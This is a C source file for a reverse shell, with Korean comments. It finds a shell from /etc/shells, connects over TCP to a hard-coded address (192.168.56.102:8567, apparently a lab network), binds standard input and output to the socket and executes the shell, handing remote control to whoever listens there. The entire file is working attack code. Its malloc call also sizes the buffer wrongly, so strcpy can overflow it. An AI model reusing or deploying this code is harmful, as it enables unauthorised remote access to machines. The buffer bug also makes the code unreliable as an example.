#include <stdio.h>
#include <stdlib.h>
#include <ctype.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <errno.h>
#include <fcntl.h>

#define RHOST "192.168.56.102"
#define PORT 8567

char* find_shell();
int reverse_shell(char *, int);

int main() {
    printf("%d\n", reverse_shell(RHOST, PORT));
    return 0;
}

char* find_shell() {
    char    line[512];
    char *  front;
    char *  back;
    FILE *  file = fopen("/etc/shells", "r");
    if (file == NULL)
        exit(1);
    while (fgets(line, sizeof(line), file) != NULL) {
        front = back = line;
        while(!isprint(*front) || isspace(*front)) front++;
        while(!isspace(*back) && (*back != '\0')) back++;
        *back = '\0';
        if (*front == '#' || (back - front) <= 1) continue;
        fclose(file);
        return strcpy(malloc(sizeof((back-front + 1) * sizeof(char))), front);
    }
    fclose(file);
    return NULL;
}

int reverse_shell(char* t_addr, int t_port) {
    int socket_fd;

    // AF_INET은 sockaddr_in을 사용한다. (netinet/in.h에 정의)
    // 대신 나중에 사용할 때 (struct sockaddr)로 명시해야함.
    struct sockaddr_in host_addr;
    char * sh = find_shell();
    char * cmd[2] = {sh, NULL};

    host_addr.sin_family = AF_INET;         // IPv4
    host_addr.sin_port = htons(t_port);      // 포트 지정
    host_addr.sin_addr.s_addr = inet_addr(t_addr);
    memset(&(host_addr.sin_zero), 0, 8);    // 8Byte 더미 영역. zero-fill 필수

    socket_fd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if(connect(
        socket_fd, 
        (struct sockaddr *) &host_addr, 
        sizeof(host_addr)
    ) != 0) {
            return 1;
    }

    dup2(socket_fd, 0);
    dup2(socket_fd, 1);
    dup2(socket_fd, 2);

    execve(sh, cmd, 0);

    // Non-reachable
    free(sh);
    return 2; 
}